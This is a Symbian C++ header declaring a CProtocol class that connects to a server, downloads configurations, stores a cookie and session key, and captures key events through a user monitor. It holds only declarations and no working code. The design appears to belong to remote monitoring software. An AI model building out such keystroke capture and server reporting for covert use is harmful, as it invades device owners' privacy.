/*
 ============================================================================
 Name		: Protocol.h
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CProtocol declaration
 ============================================================================
 */

#ifndef PROTOCOL_H
#define PROTOCOL_H

// INCLUDES
#include <e32std.h>
#include <e32base.h>
#include <in_sock.h>

#include <HT\Phone.h>
#include <HT\Logging.h>			// Logging
#include "Network.h"
#include "AbstractState.h"
#include "Monitor.h"

// CLASS DECLARATION

class MProtocolNotifier
	{
public:
	/**
	 * Will be called when the connection to the server has been completed.
	 * @param aError contains and error code or KErrNone.
	 */
	virtual void ConnectionTerminatedL(TInt aError)=0;
	/**
	 * Will be called when a new config has been downloaded.
	 */
	virtual void NewConfigDownloaded()=0;
	};



/**
 *  CProtocol
 * 
 */
class CProtocol : public CBase, public MNetworkObserver, public MStateObserver, public MMonitorObserver
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CProtocol();

	/**
	 * Two-phased constructor.
	 */
	static CProtocol* NewL(MProtocolNotifier& aNotifier);

	/**
	 * Two-phased constructor.
	 */
	static CProtocol* NewLC(MProtocolNotifier& aNotifier);

	void StartRestProtocolL(TBool aMonitor, RSocketServ& aSocketServ, RConnection& aConnection, const TDesC& aServer, TInt aPort = 80);
	
	
private:
	// From MNetworkObserver:
	virtual void NotifyConnectionCompleteL();
	virtual void NotifyDisconnectionCompleteL();
	virtual void NotifyDataReceivedL(const TDesC8& aData);
	virtual void NotifySendingCompleteL();
	virtual void NotifyNetworkError(TInt aError);

	// From MStateObserver
	void ChangeStateL();
	void SendStateDataL(const TDesC8& data);
	void NewConfigAvailable();
	HBufC8* GetRequestHeaderL();
	void SetCookie(const TDesC8& aCookie);
	void SetKey(const TDesC8& aKey);
	void SetAvailables(TInt aNumAvailables,const TDesC8& aAvailables);
	void ReConnect();
	void ResponseError(TInt aError);
	
	//From MMonitorObserver
	TBool KeyEventCaptured(TWsEvent aEvent);
			
	/**
	 * Constructor for performing 1st stage construction
	 */
	CProtocol(MProtocolNotifier& aNotifier);

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL();

	TInt GetNextState();
	
private:
	CNetwork* iNetwork;
	MProtocolNotifier& iNotifier;
	CAbstractState* iCurrentState;
	
	RArray<TInt>	iStates;	
	
	CEventCapturer* iUserMonitor;
	
	TBuf8<15>	iHost;
	TBuf<16>	iServer;
	TInt 		iPort;
	TBuf8<32>	iCookie;
	TBuf8<16>	iSessionKey;  // K key in REST protocol
	
	__FLOG_DECLARATION_MEMBER
	};

#endif // PROTOCOL_H
